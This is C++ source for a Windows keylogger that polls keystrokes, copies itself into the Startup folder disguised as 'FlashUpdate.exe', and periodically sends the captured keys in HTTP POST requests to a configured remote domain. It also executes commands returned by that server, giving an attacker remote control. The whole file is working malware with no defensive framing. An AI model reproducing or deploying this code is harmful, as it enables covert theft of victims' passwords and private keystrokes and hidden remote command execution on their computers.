#include "stdafx.h"
#include "Keylogger.h"
#include "Hax.h"

#pragma comment(lib, "Ws2_32.lib")


const int V_KEY_BEGIN   = 0x08; // [BACK]
const int V_KEY_END     = 0x91; // [SCROLLLOCK]

// http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731%28v=vs.85%29.aspx
const char* keyStrings[] =
{
    0, 0, 0, 0, 0, 0, 0, 0, "[BACK]", "[TAB]", 0, 0, 0, "[ENTER]", 0, 0,
    "[SHIFT]", "[CTRL]", "[ALT]", "[PAUSE]", "[CAPS]", 0, 0, 0, 0, 0, 0, "[ESC]", 0, 0, 0, 0,
    " ", "[PGUP]", "[PGDOWN]", "[END]", "[HOME]", "[<]", "[^]", "[>]", "[v]", "[SELECT]", "[PRINT]", "[EXECUTE]", "[PRINTSCREEN]", "[INS]", "[DEL]", "[HELP]",
    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", 0, 0, 0, 0, 0, 0,
    0, "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O",
    "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "[LWIN]", "[RWIN]", "[APPS]", 0, "[SLEEP]",
    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "*", "+", 0, "-", ".", "/",
    "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F12]", "[F13]", "[F14]", "[F15]", "[F16]",
    "[F17]", "[F18]", "[F19]", "[F20]", "[F21]", "[F22]", "[F23]", "[F24]", 0, 0, 0, 0, 0, 0, 0, 0,
    "[NUMLOCK]", "[SCROLLLOCK]", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
};
const char* keyStringsNoShift[] =
{
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o",
    "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
};

Keylogger::Keylogger() : cmdBufLen(0)
{

}
Keylogger::~Keylogger()
{

}
void Keylogger::RegisterAutorun()
{
    TCHAR exeName[MAX_PATH];
    GetModuleFileName(NULL, exeName, MAX_PATH);

    TCHAR appDataPath[1024] = {0};
    TCHAR *appData;
    size_t appDataSize;
    _tdupenv_s(&appData, &appDataSize, _T("APPDATA"));
    _tcscat_s(appDataPath, appData);
    _tcscat_s(appDataPath, _T("/Microsoft/Windows/Start Menu/Programs/Startup/FlashUpdate.exe"));

    HRESULT hr = CopyFile(exeName, appDataPath, FALSE);
    if (!hr)
    {
        Error(_T("Failed to copy file"));
    }
}

void Keylogger::Run()
{
    bool runLoop = true;
	DWORD ticksLast = GetTickCount();
	DWORD ticksNow;

 	while(runLoop)
	{
        Sleep(V_IDLE_TIME);

		ticksNow = GetTickCount();

		if(ticksNow - ticksLast >= V_SEND_INTERVAL)
		{
			ticksLast = GetTickCount();
            if (!keysPressed.empty())
            {
                this->Send();
                keysPressed.clear();
            }
		}

        bool shift = ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0)
                    ^ ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
		for(int i = V_KEY_BEGIN; i <= V_KEY_END; i++)
		{
			this->CheckKey(i, shift);
        }
    }
}

void Keylogger::CheckKey(short i, bool shift)
{
    if (GetAsyncKeyState(i) & 0x8000)
	{
        if (!keysActive[i])
        {
            keysActive[i] = true;
            
            const char* str     = keyStrings[i];
            const char* str_ns  = keyStringsNoShift[i];
            if (str_ns && !shift)
            {
                keysPressed.push_back(str_ns);
            }
            else if (str)
            {
                keysPressed.push_back(str);
            }
         }
	}
    else
    {
        keysActive[i] = false;
    }
}

void Keylogger::Send()
{
    std::string msgText;

    std::vector<const char*>::const_iterator itr;
    for (   itr = keysPressed.begin();
            itr != keysPressed.end();
            itr++)
    {
        msgText += *itr;
    }

    std::string request =
                "POST " V_NET_FILE " HTTP/1.1\r\n"
                "Host: " V_NET_DOMAIN "\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: ";
    request += std::to_string(2 + msgText.size());
    request += "\r\n\r\n" "d=";
    request += msgText;
    request += "\r\n";

    //MessageBoxA(NULL, request.c_str(), NULL, MB_OK);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);

    struct hostent *host;
	host = gethostbyname(V_NET_DOMAIN);

    SOCKADDR_IN sin;
    ZeroMemory(&sin, sizeof(sin));
	sin.sin_addr.s_addr = *((unsigned long*)host->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);

    if (connect(sock, (struct sockaddr *) &sin, sizeof(sin)) < 0)
    {
        Error(_T("connect() failed"));
        return;
    }

    if (send(sock, request.c_str(), request.length(), 0) != request.length())
    {
        Error(_T("send() sent a different number of bytes than expected"));
        closesocket(sock);
        return;
    }

    this->cmdBufLen = recv(sock, cmdBuf, this->cmdBufLen, 0);
    if (this->cmdBufLen > 0)
    {
        cmd.Run(cmdBuf);
        this->cmdBufLen = 0;
    }

    closesocket(sock);
    return;
}